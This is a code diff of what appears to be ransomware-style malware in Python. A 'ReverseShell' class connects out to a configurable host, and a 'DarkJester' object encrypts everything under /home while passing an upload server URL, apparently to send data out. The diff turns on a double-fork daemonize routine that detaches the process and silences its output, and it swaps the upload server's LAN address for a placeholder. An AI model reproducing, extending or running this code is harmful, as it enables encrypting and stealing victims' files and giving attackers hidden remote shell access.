@@ -147,29 +147,29 @@ class ReverseShell:
         self.host = host
         self.port = port
 
-    # def daemonize(self):
-        # try:
-            # pid = os.fork()
-            # if pid > 0:
-                # sys.exit(0)
-        # except OSError as e:
-            # sys.exit(1)
-        # os.chdir("/")
-        # os.setsid()
-        # os.umask(0)
-        # try:
-            # pid = os.fork()
-            # if pid > 0:
-                # sys.exit(0)
-        # except OSError as e:
-            # sys.exit(1)
-        # sys.stdout.flush()
-        # sys.stderr.flush()
-        # with open("/dev/null", 'r') as null_file:
-            # os.dup2(null_file.fileno(), sys.stdin.fileno())
-        # with open("/dev/null", 'a+') as null_file:
-            # os.dup2(null_file.fileno(), sys.stdout.fileno())
-            # os.dup2(null_file.fileno(), sys.stderr.fileno())
+    def daemonize(self):
+        try:
+            pid = os.fork()
+            if pid > 0:
+                sys.exit(0)
+        except OSError as e:
+            sys.exit(1)
+        os.chdir("/")
+        os.setsid()
+        os.umask(0)
+        try:
+            pid = os.fork()
+            if pid > 0:
+                sys.exit(0)
+        except OSError as e:
+            sys.exit(1)
+        sys.stdout.flush()
+        sys.stderr.flush()
+        with open("/dev/null", 'r') as null_file:
+            os.dup2(null_file.fileno(), sys.stdin.fileno())
+        with open("/dev/null", 'a+') as null_file:
+            os.dup2(null_file.fileno(), sys.stdout.fileno())
+            os.dup2(null_file.fileno(), sys.stderr.fileno())
 
     def start(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -182,8 +182,8 @@ class ReverseShell:
 if __name__ == "__main__":
     jester = DarkJester()
     shell = ReverseShell('127.0.0.1', 1234) # Modify this
-    server_url = "http://192.168.227.174:5000/upload"
-    # shell.daemonize()
+    server_url = "http://127.0.0.1:5000/upload" # Modify this
+    shell.daemonize()
     user_directory = "/home"
     if os.path.exists(user_directory):
         jester.encrypt_directory(user_directory, server_url, max_threads=30)
